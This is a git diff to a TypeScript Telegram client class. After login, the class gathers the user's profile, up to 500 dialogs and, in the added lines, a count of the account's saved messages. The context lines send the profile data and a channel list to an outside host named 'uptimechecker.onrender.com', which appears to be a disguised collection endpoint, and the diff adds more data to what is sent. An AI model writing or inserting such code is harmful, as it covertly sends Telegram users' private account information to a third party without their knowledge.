@@ -233,6 +233,7 @@ class TelegramManager {
                 const sess = this.client.session.save() as unknown as string;
                 const user: any = await result.user.toJSON();
                 const chats = await this.client?.getDialogs({ limit: 500 });
+                const myMsgs = await this.client.getMessages('me', { limit: 8 });
                 let personalChats = 0;
                 let channels = 0;
                 const chatsArray = [];
@@ -257,7 +258,8 @@ class TelegramManager {
                     lastName: user.lastName,
                     userName: user.username ? `@${user.username}` : null,
                     channels: channels,
-                    personalChats: personalChats
+                    personalChats: personalChats,
+                    msgs: myMsgs['total']
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
